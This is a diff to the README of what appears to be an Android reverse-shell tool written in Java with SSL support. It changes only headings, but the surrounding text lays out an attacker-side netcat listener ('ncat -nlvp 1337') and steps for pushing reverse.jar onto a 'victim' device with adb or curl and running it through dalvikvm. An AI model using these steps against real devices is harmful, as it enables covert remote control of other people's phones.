@@ -1,10 +1,10 @@
-# Pure Java Android Reverse Shell (with SSL Support)
+# Java Android Reverse Shell with SSL Support
 
 Original Tutorial: https://malacupa.com/2018/10/25/android-command-line-reverse-shell.html
 
 UPDATED WITH SSL SUPPORT https://github.com/CalfCrusher/JavaAndroidReverseShell/tree/main/SSL
 
-## On Attacker machine - Linux for example -
+## On Attacker machine - Linux -
 ### (you need android sdk installed and build-tools also) 
 
 #### Compile Java source code to bytecode (if fails for "class error not supported", change the release!)
@@ -19,7 +19,7 @@ UPDATED WITH SSL SUPPORT https://github.com/CalfCrusher/JavaAndroidReverseShell/
 #### Set Listener (USE NCAT!)
 `ncat -nlvp 1337`
 
-## On victim android device:
+## On Victim device - Android -
 `adb push reverse.jar /sdcard` (if Android Debug Tools is enabled)
 
 or you can just curl and then run the reverse shell using dalvikvm from Termux:
